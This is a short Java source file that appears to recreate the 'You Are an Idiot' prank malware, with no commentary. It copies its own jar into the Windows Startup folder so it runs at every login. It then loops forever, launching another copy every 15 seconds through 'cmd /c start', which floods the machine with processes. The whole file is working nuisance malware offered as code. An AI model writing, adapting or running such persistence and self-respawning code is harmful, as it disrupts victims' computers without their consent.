import java.io.IOException;
import java.io.*;
import java.nio.file.*;

public class main {
    public static void main(String[] args) throws IOException {
        
        new youareanidiot();
        Runtime runtime = Runtime.getRuntime();

        try {
            String appDataDirectory = System.getenv("APPDATA");
            String startupDirectory = appDataDirectory + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            String sourceFilePath = "youareanidiot.jar";
            String targetFilePath = startupDirectory + "\\youareanidiot.jar";
      
            Files.copy(Paths.get(sourceFilePath), Paths.get(targetFilePath));
          } catch (IOException e) {
            e.printStackTrace();
          }

        while (true) {
            try {
                Thread.sleep(15000);
                runtime.exec("cmd /c start youareanidiot.jar");
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

        }
    }
}